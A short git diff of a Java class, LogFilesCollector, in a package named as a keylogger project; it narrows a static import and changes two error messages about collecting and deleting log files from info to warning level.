@@ -1,7 +1,5 @@
 package com.mossad.keylogger.files;
 
-import static kisonar.platform.domain.BaseDefinitions.*;
-
 import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
@@ -11,6 +9,8 @@ import java.util.List;
 import java.util.logging.Logger;
 import java.util.stream.Collectors;
 import java.util.stream.Stream;
+
+import static kisonar.platform.domain.BaseDefinitions.EMPTY;
 
 public final class LogFilesCollector {
 
@@ -28,7 +28,7 @@ public final class LogFilesCollector {
                     .collect(Collectors.toList());
 
         } catch (IOException e) {
-            LOG.info(String.format("Cannot collect logs %s", e.getMessage()));
+            LOG.warning(String.format("Cannot collect logs %s", e.getMessage()));
             return List.of();
         }
     }
@@ -38,7 +38,7 @@ public final class LogFilesCollector {
             try {
                 Files.delete(Paths.get(path));
             } catch (IOException e) {
-                LOG.info(String.format("Cannot remove logs %s", e.getMessage()));
+                LOG.warning(String.format("Cannot remove logs %s", e.getMessage()));
             }
         });
     }
